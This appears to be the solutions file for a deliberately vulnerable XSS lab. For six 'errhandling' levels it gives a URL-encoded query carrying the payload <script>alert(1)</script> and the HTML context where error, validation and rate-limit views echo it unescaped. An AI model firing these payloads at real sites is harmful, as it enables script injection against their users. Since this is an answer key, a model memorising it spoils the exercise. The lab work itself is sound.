# errhandling — solutions

Raw reflections in error/exception/validation/rate-limit views.

### errhandling-level1

`/errhandling/level1/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection in error-message `<p>`

### errhandling-level2

`/errhandling/level2/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection in stack-frame div

### errhandling-level3

`/errhandling/level3/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection in field-error `<span>`

### errhandling-level4

`/errhandling/level4/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection inside `<pre>` (served as text/html so scripts run)

### errhandling-level5

`/errhandling/level5/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection in denied `<p>Resource: ...`

### errhandling-level6

`/errhandling/level6/?query=%3Cscript%3Ealert(1)%3C/script%3E`

- payload: `<script>alert(1)</script>`
- context: raw reflection in rate-limit `<p>Too many requests from ...`
